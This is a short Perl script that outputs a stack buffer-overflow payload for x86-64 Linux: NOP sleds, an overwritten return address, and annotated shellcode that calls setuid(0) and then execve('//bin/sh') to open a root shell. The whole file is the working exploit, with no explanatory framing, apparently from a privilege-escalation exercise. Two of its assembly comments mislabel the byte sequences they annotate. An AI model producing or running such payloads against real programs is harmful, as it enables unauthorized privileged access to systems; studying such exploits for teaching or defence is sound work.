#!/usr/bin/perl
print "\x90"x48;

print "\x90"x6;
print "\xeb\x47";

print "\xf5\x56\x26\x6c\xff\x7f\x00\x00";

print "\x90"x390;

print "\x48\x31\xc0";	#xor rax, rax
print "\xb0\x69";	#mov al, 105
print "\x48\x31\xff";	#xor rdi, rdi
print "\x0f\x05";	#syscall
print "\x48\x31\xc0";	#xor rax, rax
print "\x57";		#push rdi
print "\x68\x2f\x2f\x62\x69";	#push 0x69622f2f
print "\xc7\x44\x24\x04\x6e\x2f\x73\x68";	#mov dword [rsp+4], 0x68732f6e
print "\x48\x89\xe7";	#mov rdi, rsp
print "\x48\x83\xc4\x10";	#add rsp, 16
print "\x48\x31\xf6";	#xor rdx, rdx
print "\x48\x31\xd2";	#xor rsi, rsi
print "\xb0\x3b";	#mov al, 59
print "\x0f\x05";	#syscall
print "\x48\x31\xc0";	#xor rax, rax
#print "\xb0\xc3";	#mov al, 60
#print "\x48\x31\xff";	#xor rdi, rdi
#print "\x0f\x05";	#syscall
